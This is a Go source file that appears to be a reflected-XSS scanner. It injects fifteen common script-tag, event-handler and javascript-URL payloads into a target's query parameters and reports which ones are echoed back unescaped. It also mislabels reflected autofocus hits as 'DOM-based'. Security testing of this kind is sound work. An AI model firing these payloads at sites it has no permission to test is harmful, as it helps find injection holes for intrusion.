package native

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type XSSResult struct {
	Endpoint   string `json:"endpoint"`
	Parameter  string `json:"parameter"`
	Payload    string `json:"payload"`
	Reflected  bool   `json:"reflected"`
	Type       string `json:"type"`
}

func TestXSS(baseURL string, params map[string]string) []XSSResult {
	payloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"\"><script>alert(1)</script>",
		"'><script>alert(1)</script>",
		"<svg onload=alert(1)>",
		"<body onload=alert(1)>",
		"javascript:alert(1)",
		"\" onfocus=alert(1) autofocus=\"",
		"' autofocus onfocus='alert(1)",
		"<details open ontoggle=alert(1)>",
		"<input autofocus onfocus=alert(1)>",
		"<select autofocus onfocus=alert(1)>",
		"<textarea autofocus onfocus=alert(1)>",
		"<keygen autofocus onfocus=alert(1)>",
		"<a href=\"javascript:alert(1)\">click</a>",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	var results []XSSResult

	for param, _ := range params {
		for _, payload := range payloads {
			req, _ := http.NewRequest("GET", baseURL, nil)
			q := req.URL.Query()
			for k, v := range params {
				if k == param {
					q.Set(k, v+payload)
				} else {
					q.Set(k, v)
				}
			}
			req.URL.RawQuery = q.Encode()

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			buf := make([]byte, 4096)
			n, _ := resp.Body.Read(buf)
			resp.Body.Close()
			body := string(buf[:n])

			decodedPayload, _ := url.QueryUnescape(payload)
			if strings.Contains(body, payload) || strings.Contains(body, decodedPayload) {
				xssType := "Reflected"
				if strings.Contains(payload, "<script") {
					xssType = "Reflected (Script)"
				} else if strings.Contains(payload, "onerror") || strings.Contains(payload, "onload") {
					xssType = "Reflected (Event Handler)"
				} else if strings.Contains(payload, "javascript:") {
					xssType = "Reflected (URL-based)"
				} else if strings.Contains(payload, "autofocus") {
					xssType = "Reflected (DOM-based)"
				}

				results = append(results, XSSResult{
					Endpoint:  baseURL,
					Parameter: param,
					Payload:   payload,
					Reflected: true,
					Type:      xssType,
				})
			}
		}
	}

	if len(results) == 0 {
		results = append(results, XSSResult{
			Endpoint:  baseURL,
			Parameter: "",
			Payload:   "",
			Reflected: false,
			Type:      fmt.Sprintf("No reflected XSS detected across %d payloads", len(payloads)),
		})
	}

	return results
}
